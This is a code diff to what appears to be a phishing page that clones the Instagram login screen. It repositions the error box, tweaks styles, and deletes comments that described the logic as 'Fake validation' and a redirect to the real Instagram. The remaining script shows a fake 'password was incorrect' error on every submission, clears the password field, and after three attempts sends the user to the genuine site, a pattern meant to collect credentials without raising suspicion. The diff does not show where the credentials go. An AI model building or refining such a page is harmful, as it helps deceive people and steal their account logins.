@@ -130,7 +130,7 @@
       align-items: center;
       justify-content: center;
       gap: 8px;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
       font-weight: bold;
       color: #385185;
       font-size: 14px;
@@ -151,11 +151,12 @@
       color: #cc3333;
       font-size: 13px;
       padding: 8px 10px;
-      margin-bottom: 10px;
+      margin-bottom: 15px;
       border-radius: 3px;
       text-align: left;
       display: none;
       max-width: 350px;
+      word-break: break-word;
     }
 
     .forgot {
@@ -243,8 +244,6 @@
           draggable="false"
         />
 
-        <div class="error-box" id="errorBox" role="alert" aria-live="assertive"></div>
-
         <form id="loginForm" autocomplete="off" spellcheck="false">
           <input
             type="text"
@@ -281,6 +280,9 @@
           Log in with Facebook
         </a>
 
+        <!-- ERROR BOX BELOW FACEBOOK LOGIN -->
+        <div class="error-box" id="errorBox" role="alert" aria-live="assertive"></div>
+
         <div class="forgot">
           <a
             href="https://www.instagram.com/accounts/password/reset/"
@@ -312,7 +314,6 @@
 
     let failedAttempts = 0;
 
-    // Enable button only when username and password length >= 6 (Instagram minimum)
     function checkInputs() {
       const usernameValid = usernameInput.value.trim().length >= 1;
       const passwordValid = passwordInput.value.length >= 6;
@@ -332,31 +333,24 @@
     loginForm.addEventListener('submit', (e) => {
       e.preventDefault();
 
-      // Fake validation
-      const username = usernameInput.value.trim();
       const password = passwordInput.value;
 
-      // If password too short, don't submit and clear error
       if (password.length < 6) {
         errorBox.style.display = 'none';
         return;
       }
 
-      // Fake "wrong password or username" logic
       failedAttempts++;
 
       if (failedAttempts >= 3) {
-        // Redirect to real Instagram after 3 failed attempts
         window.location.href = 'https://www.instagram.com/';
         return;
       }
 
-      // Show error like Instagram
       errorBox.textContent =
         'Sorry, your password was incorrect. Please double-check your password.';
       errorBox.style.display = 'block';
 
-      // Clear password input
       passwordInput.value = '';
       checkInputs();
     });
